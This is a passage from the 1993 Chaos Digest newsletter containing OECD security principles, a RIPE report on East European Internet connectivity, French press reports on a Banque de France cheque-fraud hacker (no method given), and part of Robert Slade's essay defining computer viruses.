        The responsibilities and accountability of owners, providers
and users of information systems and other parties concerned with the
security of information systems should be explicit.

"2.  Awareness Principle

        "In order to foster confidence in information systems, owners,
providers and users of information systems and other parties should
readily be able, consistent with maintaining security, to gain
appropriate knowledge of and be informed about the existence and
general extent of measures, practices and procedures for the security
of information systems.

"3. Ethics Principle

        "Information systems and the security of information systems
should be provided and used in such a  manner that the rights and
legitimate interests of others are respected.

"4. Multidisciplinary Principle

        "Measures practices and procedures for the security of
information systems should take into account of and address all
relevant consideration and viewpoints, including technical,
administrative, organizational, operational, commercial, educational
and legal.

"5.  Proportionality Principle

        "Security levels, costs, measures, practices and procedures
should be appropriate and proportionate to the value of and degree of
reliance on the information systems and to the severity, probability
and extent of potential harm, as the requirements for security vary
depending upon the particular information systems.

"6. Integration Principle

        "Measures, practices and procedures for the security of
information systems should be co-ordinated and integrated with each
other and with other measures, practices and procedures of the
organization so as to create a coherent system of security.

"7. Timeliness Principle

        "Public and private parties, at both national and
international levels, should act in a timely co-ordinated manner to
prevent and to respond to breaches of information systems."

"8.  Reassessment Principle

        "The security information systems should be reassessed
periodically, as information systems and the requirements for their
security vary over time.

"9. Democracy Principle

        "The security of information systems should be compatible with
the legitimate use and flow of data ad information in a democratic
society."

[Source: OECD Guidelines for the Security of Information Systems (1992)]

------------------------------

End of Chaos Digest #1.03
************************************

Chaos Digest            Mercredi 20 Janvier 1993            Volume 1 : Numero
4

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.04 (20 Janv 1993)
File 1--Connectivite Internet en Europe de l'Est

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost from jbcondat@attmail.com. The editors may be contacted
by
voice (+33 1 40101775), fax (+33 1 40101764) or S-mail at: Jean-Bernard
Condat,
Chaos Computer Club France [CCCF], 47 rue des Rosiers, 93400 St-Ouen, France

Issues of Chaos-D can also be found on some French BBS. Back issues also may
be
obtained from the mail server at jbcondat@attmail.com: all incoming messages
containing "Request: ChaosD #x.yy" in the "Suject:" field are answered (x is
the volume and yy the issue).

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views.  ChaosD
material may be reprinted for non-profit as long as the source is cited.  Some
authors do copyright their material, and they should be contacted for reprint
permission.  Readers are encouraged to submit reasoned articles in French,
English or German languages relating to computer culture and telecommunica-
tions.  Articles are preferred to short responses.  Please avoid quoting
previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue, 24 Nov 92 10:43:25 EDT
From: budd@cspgas11.bitnet (Ricahrd Budd )
Subject: File 1--Connectivite Internet en Europe de l'Est

+++++++
draft version 5
September 1992


  An overview of East and Central European networking activities

                              Milan Sterba

                         





     1. Introduction

     This paper  is based  on work  of the  RIPE Connectivity  Working
Group.  It summarises the main issues of international connectivity of
East and Central European countries (ECE).  It is based on reports and
information  gathered by  network  representatives of these countries,
who have been present at the meetings or contacted on other occasions.

     Thanks are  due  to  all  those  who  helped  us  to  gather  the
information.   Some  countries  however, are  not represented in  this
report, due to lack of information.  Please contact the author if  you
have amendments or suggestions.

     This report  contains lists  of people  who are  responsible  for
international networking in each of their  countries and a map of  the
current situation in IP  networking in the those  countries.  The  map
doesn't show all existing international  lines of those countries  but
it seeks to be  complete for IP lines  and other leased lines  without
usage restrictions for the academic and research communities.

     This    report    has    been    written    by    Milan    Sterba
   and  it does  not  necessarily  reflect  the
opinions of the authors of the national reports nor those of the  RIPE
community.


     2. Present situation - External networking

     This chapter gives  as detailed  as possible  description of  the
various network activities in the East and Central European countries.
The  sections for  particular  countries  will  be subject to  regular
amendments or changes.

     Considerable progress has been  made during the  last year in  IP
connectivity of ECE countries. Czechoslovakia and  Poland have today,
several  hundreds of connected hosts each and are the  most advanced
ECE  countries with respect to  IP connectivity.

     Bulgaria, Estonia and Hungary do also have IP connectivity today
and have several tens of connected  hosts each. By the end of 1992 IP
connectivity will probably also reach Latvia an dLithuania through
NORDUnet and maybe also Romania and one of the CIS republics.

     In all the connected countries the initial capacity of
international lines has rapidly become insufficient and it has been
sought to upgrade existing  lines and  set  up  reasonable   backup
solutions.  Inter- networking  is  rapidly  spreading  and   good  IP
connectivity   is considered as  the first  priority by  the national
academic  network organisations.

     All the countries considered have at the present time some (often
more than one) connection to international networks. Certain countries
have  only  a dial-up  e-mail  connectivity,  others  have  low or
medium speed leased lines.  The present state of international leased
lines to ECE countries is represented on the map in Appendix A.

     RIPE broadly  contributes to  this rapid  evolution by  technical
advice and by coordination efforts.

     2.1 Albania

     Curently  an  electronic  mail  connection  exists  between   the
University of Tirana and the Internet.  The gateway and relay function
resides at CNUCE, Pisa, Italy.

Contact Persons:

Maksim Raco                - University of Tirana
Francesco Gennai  - CNUCE, Pisa, Italy

     2.2 Estonia

     Estonia works in close co-operation  with NORDUnet in setting  up
external IP links.   Currently  a  64  kbits/s IP  satellite  link  is
operational between Tallin and  Helsinki (Finland), and between  Tartu
and Helsinki.    These  will eventually  connect  the  planned  Baltic
backbone network (BaltNet) to the rest of the Internet.

  Contact persons:

  Ants Work            - Institute of Cybernetics, Tallin

     2.3 Latvia

     A dial-up  EUnet  connection  exists between  Riga  and  Helsinki
(Finland).  A  64  kbit/s IP satellite link between Riga and  Helsinki
(Finland) is planned for later this  year.  This link will  eventually
connect to the planned Baltic backbone network (BaltNet).

Contact persons:

Sergei Rotanov        - Institute of Electronics
Riga Sergeijs Dmitrijevs 
              - candidate for Latvian EUnet backbone (now RELCOM Riga)

     2.4 Lithuania

     A dial-up EUnet  connection exists between  Vilnius and  Helsinki
(Finland).  A 9.6 kbit/s X.25 link, used for X.400 electronic mail and
sponsored  by  Norwegian  Telecom, exists  between  Vilnius  and  Oslo
(Norway).

Contact persons:

Laimutis Telksnys 
                                  - Institute for Mathematics, Vilnius
Algirdas Pakstas 
                                  - Institute for Mathematics, Vilnius

     The Baltic states are coordinated  within the BaltNet body  which
plans to build a backbone connecting  Baltic states with NORDUnet.
A LISTSERV mailing list exists for this purpose (NORDBALT@searn.sunet.se).

     2.5 Bulgaria

     A switched international X.25 connection connects the Bulgarian
EARN  node in Sofia to Linz  (Austria).   A  dial-up connection over
public  X.25 connects  the  Bulgarian EUnet via the  backbone node in
Varna to  the Internet  via  the  EUnet node  in Heraklion (Greece).
Co-ordination between both projects, resulting in  a shared fixed IP
connection,  is under study.

     Several  tens  of EUnet  sites  are now connected  over dial-up
links to the national EUnet backbone.  A public X25 service is available
to  a  limited  extent.   EARN  services  have  been  opened recently
at Sophia University  but no gateway  exists between the  two services yet.

Contact persons:

Daniel Kalchev     - EUnet backbone manager  BG,
                                      contact for BG.  top level domain
Anton Velichkov  - EARN president for Bulgaria
Alexander Simeonov  - Center for Informatics, Sophia


     2.6 Commonwealth of Independent States.

     Dial-up connections  between  Helsinki  (Finland)  and  Amsterdam
(Netherlands) on the one  hand, and Moscow on  the other hand  connect
the Relcom network in Russia and a few other former USSR republics  to
the Internet.  Currently the  services consist of electronic mail  and
Network News.   A 9.6  kbit/s leased  line from  Moscow to  Copenhagen
(Denmark) connects  the  EARN node in  Moscow  to  the  EARN/BITNET
network.  A 4.8  kbit/s leased line between  Moscow and DESY,  Hamburg
(Germany), supporting  IP, delivers  HEPnet services  to two  research
institutes in  Moscow.    Low  speed links  between  Moscow  and  ESOC
(Germany) and CNES (France) serve the space physics community.

     A  considerable  effort  undertaken  by  the  RELKOM networking
organization  has brought  e-mail connectivity  to  several thousands of
sites all  over the  former  Soviet Union.   The growth  of  the network
is several 100%  a year.  RELKOM  operates now an IP  backbone which
goes from   St. Petersburg to  Novosibirsk.   The whole  network has
some 60  regional centres,  some of  which connect  more than  500
sites.  RELKOM's international traffic is split over two dial-up lines,
one to the the Finish EUnet backbone and one the central EUnet node in
Amsterdam. Both operate as gateways on  application level.  The rapidly
growing volume of international mail traffic makes the need for a medium
speed IP channel to Europe an urgency.

     The first EARN node started its operation in Moscow late in  1991,
but the spreading of EARN  services is still expected. Negotiations  are
still underway to set up an e-mail gateway between both networks.

Contact persons:

Dima Volodin             - EUnet backbone manager SU
Misha Popov                - EUnet - RELCOM
Nickolay M.Saukh             - EUnet - RELCOM
Valery Bardin                - EUnet - RELCOM
Andrej Mendkovich    - CIS EARN director
Igor Sviridov 
                                          - EUnet - Ukraine contact.

     2.7 Czechoslovakia

     A 64 kbit/s  IP link  between  Prague and  Linz  (Austria)  is
operational today.   The  line  is shared between general IP, EARN  and
czech EUnet traffic. A  second link,  14.4 kbit/s between  Bratislava and
Vienna is shared  between EUnet  traffic and  general IP  traffic and IXI.
Both  links  connect  into  the upcoming  national academic  backbone
networks CESNET (Czech Educational and Scientific Network) and SANET (Slovak
Academic Network). Both networks are interconnected over a 19.2 kbit/s IP
link between Prague and Banska Bystrica.

     Both CESNET and SANET are now setting up national backbone infrastruc-
tures connecting major academic towns in the country. 64 kbit/s lines are used
wherever available and considered necessary, 19.2 kbit/s on all other links.
The first protocol supported is IP. Connected to the backbones are appearing
metropolitan networks in major cities.

    The major coordinating bodies are CESNET and SANET where universities
as well as Academy of Sciences, EARN and EUnet are represented. A good
cooperation exists between both separately funded projects as well as good
cooperation with ACOnet, EARN, EUnet, WIN, INRIA France and others.


Contact persons:

Jan  Gruntorad   - EARN director for Czechoslovakia
                                       and CESNET coordinator
Pavel Rosendorf   - contact for .CS top level domain
Jiri Orsag             - CS NIC and EUnet Prague
Peter  Pronay    - president of EUnet Czechoslovakia
Gejza Buechler   - EUnet backbone manager CS
Karol Fabian  - SANET
Vladimir Kassa       - SANET
Jaroslav Bobovsky  - SANET
Milan Sterba    - author of this report, CESNET
Ivo Smejkal              - CESNET - user services

     2.7 Hungary

     Hungary is connected  to EARN  by a  9.6 kbit/s  IP line  between
Budapest  and  Linz (Austria).   For the time  being the same line  is
used also for  the Internet and  EUnet connection.   It is planned  to
upgrade this  line to  64 kbit/s  in 1992.   The  High Energy  Physics
community has access to HEPnet services  via a 9.6 kbit/s leased  line
between Budapest and CERN, Geneva  (Switzerland) which is now  running
IP.

     Hungary has a good  operational public X25  network which is  the
base of  Wide  Area Networking  between small and medium sized  sites.
Currently there are about  250 X.25 access points  in the country.   A
high speed leased line backbone is foreseen for connecting large sites
in the near future.

     In Hungary a  national program under  the title "R&D  Information
Infrastructure  Program  (IIF)"  is  responsible for the research net-
working.  The "HUNGARNET"  co-ordinates the networking  activities  of
different  user groups,  such  as  "HUNINET" (Universities  and   high
schools),  "AKANET"   (academic   research institutes),  and the  user
group of  public collections  (libraries, museums),  meanwhile part of
the funding goes through IIF.


Contact persons:

Nandor Horvath         - EUnet backbone  manager,
                                            domain contact for HU
Laszlo Zombory           - EARN president,
                                            chairman  of HUNINET
Laszlo Csaba      - EARN  director  for Hungary
Istvan Tetenyi    - EARN deputy director
Peter Bakonyi             - President of IIF Exec Com.
Geza Turchanyi          - HUNGARNET CRIP
Piroska Giese  - HEPnet
Ferenc Telbisz       - HEPnet

     2.8 Poland

     The main external  connection consists of  a 64 kbit/s  satellite
link between Warsaw and Stockholm (Sweden).  The link is an IP one and
carries all Internet, EARN  and  EUnet traffic. A new 64 kbit/s IP link
is being set between Warsaw and Vienna with the objective to set up an
Ebone Bondary System in Warsaw. A 9.6 kbit/s IP connection is in place
between  Krakow and  CERN, Geneva (Switzerland) for HEPnet services.

     Public  X25  services have only started in 1992. Thus connections
at national level can only be implemented on switched  or leased lines.
The country already has an infrastructure of leased lines, shared between
EARN and IP  traffic operting at speeds between 9.6-64 kbit/s.

     The Polish network is coordinated by an organization called  NASK
(National Academic  and  Research  Network) which  also  includes  the
Polish part of EARN. Realistic plans exist to substantially  extend IP
connectivity over the territory in 1992 using 64 kbit/s lines on their
national backbones wherever possible and economically viable. A National
Network  Operation and Monitoring Center has been set up in early 1992
which  operates the whole national and international infrastructure. A
system of network user training and support has also been put in place.

Contact persons:

Tomasz Hofmokl       - EARN director for Poland
Rafal Pietrak       - Warsaw - Copenhagen
                                            connection
Krzystof Heller - contact for PL domain
Daniel J.Bem         - Polish academic network (NASK)
Jerzy Gorazinski    - Polish State Committee for
                                            Scientific Research
Jerzy Zenkiewicz    - Polish academic network (NASK)


     2.9 Romania

     Romania doesn't have any international  connectivity yet.  A  9.6
kbit/s leased line will  be put in before end 1992 between  Bucarest
and Linz (Austria).   This  line will  be able  to carry  both IP  and
EARN/NJE/BSC traffic.

     Romania has  no internal  networking infrastructure  at all.    A
government  project  of  building  a  public  X25  network  is   under
commercial negotiations and  should start  to offer  some services  in
early 1993.

     In  Romania  the  emerging  networking  activities  seem  to   be
coordinated by the National Council for Informatics and the  Institute
of Informatics.

Contact persons:

Florin Paunescu     - National Council for Informatics
Paul Dan Cristea 
                                    - Polytechnic Institute of Bucharest

     2.10 Slovenia

     Slovenia is  connected  over a  64  kbit/s IXI  access  point  in
Ljubljana to the IXI  backbone.  Over this  connection an IP link  via
NIKHEF, Amsterdam  (Netherlands) provides  Internet connectivity.    A
PSDN X25  connection connects  the  main EUnet  node in  Ljubljana  to
EUnet.  Another IXI access point, also located in Ljubljana,  connects
Croatia, Bosnia and Herzegovina to IXI over the YUPAK PPSDN.

      Currently Slovenia  have achieved  a good  degree  of capillarity
of their national networks due to the existence of a  wide spread public
X25 network.

     Yugoslavian academic networking activities have been  coordinated
by the  National  Academic Networking Organization YUNAC.  Beside this
both EARN and EUnet are present in Slovenia and Serbia.  YUNAC is  now
applying for international membership in RARE and works to  reorganize
itself in a NORDUnet-like way.  In Slovenia the Academic and  Research
Network of Slovenia (ARNES) is coordinating network activities.

Contact persons:

Leon Mlakar           - EUnet backbone manager YU
Borka Jerman-Blazic  - YUNAC
Marko  Bonac   - ARNES Executive Director
Denis Trcek    - ARNES

     2.11 Serbia and Montenegro

     Serbia has had a 9.6 kbit/s leased line between Beograd and Linz to
carry EARN traffic.  Currently this line is cut according to a decision
of the Austrian government about the UN embargo of new Yugoslavia.

Contact persons:

Jagos Puric       - EARN director for YU



     3. Evolution

     All the ECE countries are very interested in European as well  as
world  wide  IP connectivity.   In Czechoslovakia, Hungary and  Poland
there has been rapid growth of connected IP networks and hosts in  the
academic  community.    Their  existing  international  leased   lines
infrastructure is now shared by EARN, EUnet and raw IP services.  Linz
University (Austria)  has  becomme an  important  concentrating  point
for Bulgaria, Czechoslovakia,  Hungary  and  in the future for Poland
and Romania.

     The  financial  resources  dedicated   to  networking  in   these
countries are limited.  The sharing of the existing national and
international leased lines between EARN, EUnet and other IP traffic as
well as between academic and starting commercial traffic is thus a  very
important issue. Lightweight but robust IP gateway solutions (over
dial-up lines, leased serial lines or X25 networks) are of great concern
in this respect  and are continuously studied and further developped
(e.g. COPERNICUS).

     By the end of this  year the Budapest-Linz IP  link at least will
be operating at 64  kbit/s.  It is probable that new  IP lines will be
operational at this  time (Bucarest-Linz,  Sophia-Linz, Varna-Amsterdam).

     In the same  time the  national infrastructure  of the  countries
will also evolve.  We can  expect an increase in national coverage  in
countries with working public X25  networks and in Czechoslovakia  and
Poland.


     4. International Initiatives

     Several international support initiatives  have been launched  in
the  past  by  different  bodies  to  improve  international   network
connectivity  of  the  Central and  Eastern European coun tries.   The
following list presents some of them :

     The Ebone 92 consortium has shown itself very supportive during
1992 by  allowing traffic of ECE countries to pass freely over the Ebone
and letting so the ECE countries traffic cross Europe.

     RIPE and the RIPE NCC have widely  contributed to the rapid
integration of new ECE networks into the global Internet. RIPE has acted
as an initiator of a common coordination effort of academic networking
organizations in Bulgaria, Czechoslovakia, Hungary and Poland.  A first
co-ordination meeting has been held in Prague  in february 1992 and a
successfull cooperation has started since, continued on 3rd Joint
European Networking Conference in Innsbruck, where RARE has proposed to
be the coordinating place on ECE integration to european academic
networking and another meeting in Prague in August. CEEC@RARE.NL is now
the focussing mailing list on  common ECE networking issues.

     Also both EARN and EUnet have widely contributed to the successfull
start of international networking in ECE countries, by placing the first
network nodes to these countries, supporting the activity of these nodes
both financially and by extensive know-how transfer.

     Despite this large cooperation willingness (RARE, RIPE, EARN, EUnet
etc.) an EC PHARE  project dedicated  to extend  the  not really
successfull COSINE  IXI project  to  Bulgaria,  Czechoslovakia, Hungary,
Poland and  Romania has started this year. This project places a 64
kbit/s IXI link to  each country starting from the  IXI backbone. These
national access points should provide OSI as  well as  IP services. The
primary goal of the project (improve regional A&R computer
 communications) is  very laudable. Unfortunately no  coordination with
RIPE has taken place and no serious technical information has been
given.  The project has not taken  in account the plans of the national
academic organizations in at least some of the countries involved, nor
the european A&R networking  reality.

     Austria is the major relay point between  ECE countries and Western
Europe (and  further).  The Austrian  government is very supportive and
either covers fully or participates in a significant  manner to costs of
international connections  to these countries.  In February 1992 ACONET
has made an  even larger proposal, offering  these countries (Bulgaria,
Czechoslovakia, Hungary  and  Poland)  double  connectivity to both
Vienna and  Linz. Each of these  countries should  have one  link to
both places,  thus permitting line backup.   The Linz-CERN line should
be replaced by  a Linz-Amsterdam line  and both  Austrian lines  should
be  upgraded  in order to accomodate traffic increase from these
countries and offer  a real backed-up connectivity to EBONE 92.   With
relation to the  Ebone 92 initiative  the idea  of setting  up an  EBS
for  ECE countries  in Austria is well justified.

     CERN plays also an important role  in the IP connectivity of  the
new countries.  It houses actually  a 9.6 kbit/s line from Krakow  and
another HEPnet  9.6  kbit/s  line  from Budapest.    Due  to  lack  of
resources CERN prefers not to house a lot of low rate lines from every
country but rather to house  a higher rate line concentrating  traffic
from several countries.  This is  in fact in perfect conformance  with
the ACONET proposal.

     The German DFN network has launched several regional  initiatives
to  connect  sites   in  geographical  proximity   of  Germany   (e.g.
Dreilaendereck  project connecting Liberec in Czechoslovakia,  Wroclaw
in Poland and Zittau in Germany  using leased links based on X25  with
further connectivity to DFN).  There is also strong cooperation of the
Slovanian academic network  with DFN  within the scope  of the  COSINE
project.

     The Italian government has financed in 1990 and 1992  successfull
network workshops  (NetSchool) to  which  about 50 network specialists
from  ECE  countries  have  attended.   A  second extended edition  of
NetSchool has taken place in April 1992  with participation of network
specialists  from  RIPE  and  attendees from ECE countries, some South
American, Asian and African countries.

     A similar event has been organized by NORDUnet for network  users
and operators from the Baltic states.

     The French government has expressed  its willingness to help  the
integration  of new  countries to the world of academic networking  by
launching in  co-operation with  INRIA  a project  called  Copernique,
which aims to  improve network connectivity  of several Eastern
European Countries.  One of the first results of this project has been
the cooperation on design and implementation  of the academic IP
backbone CESNET-SANET (Prague - Brno - Bratislava  ...  Banska  Bystrica
- Kosice) in Czechoslovakia.   The  project  consists  of  network
management  and administration know-how transfer, common development of
tools and some software and hardware donations.   A similar activity is
now  starting with Romania.

     IBM  is  also  present  in  these  countries  with  its  academic
initiative  in   which   IBM   mainframes   have   been   offered   to
Czechoslovakia, Hungary  and Poland.    IBM and  EASInet act  also  as
sponsors  for  the  T1  US   link  usage  for  academic  networks   in
Czechoslovakia and Hungary.

     The assistance of countries  with developed networking  shouldn't
be uniquely oriented to basic network connectivity.  A lot of work  is
to be done  in the  ECE countries to  offer and  improve higher  level
network services like e-mail, teleconferencing, archive services,
online  databases  and  library catalogues  etc.,  as well  as  in
basic network concepts, user  information services  and advanced
networking know-how transfer.  That's why new EC projects proposals are
now  oriented not only on infrastructure but also on higher level
services (e-mail, electronic directory, user information and training).
Lack of funds is extremely disadvantegeous and the exchange  rates  make
it  very  difficult for  ECE network experts to attend international
network events.


     5. Technical issues

     As already mentioned,  distributing international network  access
over the  local  territory  is  a  major  problem  for  the  countries
considered.  While it is relatively easy  and cheap to set up a  local
TCP/IP network it  is more  difficult to  connect it  to the  national
access point.  Generic  router solutions are  rather expensive on  one
side and not  completely free of  administrative exportation  problems
for all countries involved.

     The solution to these problems are software routers based on PC's
or workstations and public domain or easily available software.

     A low cost capillarity of  networks being of great importance  to
ECE countries, good  dial-up IP solutions  both industrial and  public
domain,  which  are  under  study  and  evaluation  in  EUnet,   RIPE,
Copernique, NetSchool and others, are of great interest as well as low
cost IP solutions on synchronous lines (X25 or PPP)

    The technical speed limitations for international leased lines seem
now to become less restrictive than in the past. For Czechoslovakia,
Hungary and Poland, international links up to 2 Mbit/s are now feasible.

    With the basic connectivity problems being progressively solved the
network services and network management are now becomming major issues in
the most advanced ECE countries. PC's remain the most spread technical basis,
thus network solutions based on this platform (routers, mail, news, archive
and information servers and clients) either Unix or MS DOS oriented are of
major concern today.

     6. Organizational issues

     The  starting  period  in   international  networking  is   often
characterized by a fuzziness in the organizational structure  together
with a lack  of information about  the people actually responsible and
working  in  the  area.    The  situation  is  nearly  stabilized   in
Czechoslovakia, Hungary and Poland, where national academic networking
groups  have  been  founded   and  are  coordinated  with   EARN/EUnet
activities, and  a  coordinated  effort  tends  to build  nation  wide
multiprotocol academic network infrastructures.   A similar effort  is
underway in  Bulgaria  (UNIKOM,  EARN and  EUnet Bulgaria). These
countries seem also to have found a stabilized position in international
network organizations (EARN, EUnet, RARE, RIPE). The situation is more
complicated in other countries where international contacts are for
various reasons much more scarce.

------------------------------

End of Chaos Digest #1.04
************************************

Chaos Digest               Lundi 25 Janvier 1993        Volume 1 : Numero 5

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.05 (25 Janv 1993)
File 1--Un pirate a l'abordage de la Banque de France
File 2--Le coup d'un genie de l'informatique
File 3--Definition des codes parasites autopropageables (CPAs)
File 4--Le Pheacking americain vu du cote francais
File 5--Horloge en panne, pourquoi?
File 6--Jeune Lettonien a la recherche de correspondants

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost from jbcondat@attmail.com. The editors may be
contacted by voice (+33 1 40101775), fax (+33 1 40101764) or S-mail at:
Jean-Bernard Condat, Chaos Computer Club France [CCCF], 47 rue des Rosiers,
93400 St-Ouen, France

Issues of Chaos-D can also be found on some French BBS. Back issues also
may be obtained from the mail server at jbcondat@attmail.com: all incoming
messages containing "Request: ChaosD #x.yy" in the "Suject:" field are
answered (x is the volume and yy the issue).

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Sat Jan 23 00:09:28 +0100 1993
From: langlois@ciril.fr (Langlois Ph. )
Subject: File 1--Un pirate a l'abordage de la Banque de France
Copyright: Agence France Presse, 1993

  Divers escroquerie -  Arrestation d'un jeune escroc qui avait perce
les secrets de la Banque de France- GRENOBLE, 17 jan  93 (250 MOTS)
  Un jeune homme de 22 ans qui avait reussi, par un stratageme non
revele par les policiers, a percer un secteur secret de la Banque de
France en s'infiltrant dans le systeme informatique, a ete arrete et
ecroue samedi apres avoir ete presente au Parquet de Grenoble.
  Laurent Darvey, domicilie a Fontaine (Isere) et passionne
d'informatique, a reussi a connaitre le code donnant la liste des
chequiers voles centralisee a la Banque de France, a-t-on indique de
source policiere.
  Ayant derobe des chequiers, il a pu disposer librement de ceux qui
ne figuraient pas sur ces listes. C'est ainsi qu'au cours des deux
dernieres annees, il a utilise les formulaires de six chequiers ne
lui appartenant pas et "depenser" la somme relativement modeste de
40.000 francs. Pour mieux ecouler ces cheques, il avait egalement
derobe trois cartes d'identites qu'il a falsifiees.
  Il a ete demasque par un commercant qui avait releve le numero
de la carte d'identite presentee mais egalement celui de l'automobile
au volant de laquelle l'escroc repartait. Les plaques mineralogiques
etaient egalement fausses mais le signalement precis du commercant a
permis l'arrestation du jeune homme qui s'est vu signifier une
inculpation de faux, usage de faux et escroquerie.
   HM/jmg

------------------------------

Date: Fri Jan 22 13:52:48 -0500 1993
From: Mike.Swartzbeck@p816.f70.n109.z1.fidonet.org (Mike Swartzbeck)
Subject: File 2--Le coup d'un genie de l'informatique
Copyright: Serge Pueyo, France Soir, 1993

            UN PIRATE A L'ABORDAGE DE LA BANQUE DE FRANCE

       Il annulait les oppositions faites sur les cheques voles.
                 Exploit technique mais maigre butin

     Laurent Darvey a 22 ans. Domicilie a Fontaine, pres de Grenoble
(Isere), il a une passion: l'informatique, ou plus exactement le piratage
informatique. En 1991, il se procure sous une fausse identite un document
informatique qui lui permet d'acceder au fichier de la Banque de France,
fichier contenant les identifications des cheques voles. Grace a son
ordinateur et par un procede de son invention, qui n'a pas ete revele,
Laurent Darvey reussit a annuler les procedures d'opposition faites sur les
chequiers qu'il a derobes.

     Le jeune homme ne se contente pas de pirater la Banque de France. Il
est aussi voleur et faussaire a ses heures. Il a ainsi vole a plusieurs de
ses collegues de travail leurs chequiers et leurs papiers, qu'ils
s'empressait aussitot de maquiller habilement. De plus, il circulait avec
un voiture faussement immatriculee. Laurent Darvey ne semblait pas avoir de
gros besoins, puisqu'en un peu plus d'un an, il n'aurait emis que 40.000 F
de cheques voles.

     Mais une habitante de Voiron (Isere) va mettre les policiers sur ses
traces. En decembre, Laurent darvey lui achete pour 5.500 F un ordinateur,
qu'il revend aussitot. Mefiante, la dame releve toutefois le numero de sa
carte d'identite et, a la derobee, le numero de sa plaque
d'immatriculation. Au cas ou...


CARTE VOLEE.  Decouvrant qu'elle a ete payee avec un cheque en bois, elle
porte plainte. Les enqueteurs s'apercoivent alors que la fausse carte
d'identite de l'escroc a ete volee en juin 1991 dans un centre de formation
professionnelle pour adultes, a Pont-de-Claix. Ils se font donc remettre
tous les dossiers des stagiaires--soixante-six au total--parmi lesquels se
trouve celui de Laurent Darvey, puisqu'il avait suivi une formation dans ce
centre.

     Sa victime le reconnait sur photo. Les policiers ont arrete jeudi
dernier le jeune homme a son domicile, ou ils ont retrouve d'autres
chequiers voles, des cartes d'identite falsifiees et du materiel
informatique, vole lui aussi. Laurent Darvey a reconnu sans difficulte les
faits qui lui sont reproches. Il a ete ecroue a la prison de Varces, pres
de Grenoble.

     Comme le prejudice n'est pas tres eleve, on peut penser que, pour le
petit genie de l'informatique, pirater la Banque de France, reputee
inviolable, etait finalement le but du jeu. Un petit jeu qui s'acheve
pourtant derriere les barreaux.

------------------------------

Date: Sat Jan 23 13:49:00 -0600 1993
From: roberts@decus.arc.ab.ca ("Rob Slade, DECrypt Editor, VARUG NLC rep,
604-984-4067" )
Subject: File 3--Definition des codes parasites autopropageables (CPAs)
Copyright: Robert M. Slade, 1991, 1993


            Towards a Definition of computer Viral Programs
                              Robert Slade

    (The following is excerpted from Robert Slade's weekly column on
    Computer Viral programs published in VIRUS-L and on Fidonet.  These
    articles originally appeared in July, 1991.)

The "man on the street" is now often aware of the term "computer virus"
even if he (or she) does not use a computer.  However, it is often the case
that those who are otherwise technically literate do not understand some of
the implications of the phrase.  This is not surprising in that the term is
slang, is often misused, and that "hard" information is difficult to come
by.

It is important to know what a computer virus is if you are going to defend
yourself against the many that are "out there."  It is also important to
know what a computer virus is not.  There are other types of programs and
situations which can do damage to your computer or data, and many of these
will not be caught by the same methods which must trap viral programs.

A biological analogy, which we find in the dictionary, is helpful.  The
Oxford English Dictionary, which speaks of:
    "...a moral or intellectual poison, or poisonous influence..."
while satisfying to the wounded ego of those who have been hit is not
terribly helpful in a technical sense.  Webster, however, steers us in a
more helpful route in stating that a virus is:
    "...dependent on the host's living cells for their growth and
reproduction..."

By eliminating the biological references, we can come to the definition
that a virus is an entity which uses the resources of the host to spread
and reproduceitself without informed operator action.  Let me stress here,
the word "informed."  A virus cannot run completely on its own.  The
computer user must always take some action, even if it is only to turn the
computer on.  This is the major strength of a virus: it uses *normal*
computer operations to do its dirty work, and therefore there is no single
identifying code that can be used to find a viral program.

I must make mention, before I continue, of the work of Fred Cohen.  Dr.
Cohen is generally held to have coined the term "computer virus" in his
thesis, published in 1986.  However, his definition covers only those
sections of code which, when active, attach themselves to other programs.
This, however, neglects many of the programs which have been most
successful "in the wild".  Many researchers still insist on this
definition, and therefore use other terms such as "worm" and "bacterium"
for those viri which do not attack programs.

Having established that viral programs copy themselves, and before going on
to related types of programs, let me list a few things that viri are *not*.

Let me first say that computer viral programs are not a "natural"
occurrence.  These are programs which are written by programmers.  They did
not just appear through some kind of electronic evolution.  Viral programs
are written, deliberately, by people.  (Having studied the beasts almost
from their inception, I was rather startled when a young, intelligent, well
educated executive proposed to me that viri had somehow "just grown" like
their biological counterparts.)

The popular press has recently started to publicize the term computer
virus, but without giving any details other than the fact that viri are to
be feared. (Often the reports talk about "main storage destroyed" and other
such phrases which have very little meaning.)  This has given most people
the impression that anything that goes wrong with a computer is a virus.
>From hardware failures to errors in use, everything is blamed on a virus.
*A VIRUS IS NOT JUST ANY DAMAGING CONDITION.*

Likewise, it is now considered that any program that may do damage to your
data or your access to computing resources is a virus.  We will speak
further about trojan horse programs, logic bombs and worms, but it is
important to note that viral programs have common characteristics that
other damaging or security breaking programs may lack.  Viri are not just
any damaging program.

Indeed, viral programs are not always damaging, at least not in the sense
of being deliberately designed to erase data or disrupt operations.  Most
viral programs seem to have designed to be a kind of electronic graffiti:
intended to make the writer's mark in the world, if not his or her name.
In some cases a name is displayed, on occasion an address, phone number,
company name or political party (and in one case, a ham radio license
number.)

On the other hand, viral programs cannot be considered a joke.  Often they
may have been written as a prank, but even those which have been written so
as not to do any damage have had bugs, in common with any poorly written
program.  The author of Stoned obviously knew nothing of high density
floppies or RLL drive specifications.  In fact, it appears that the
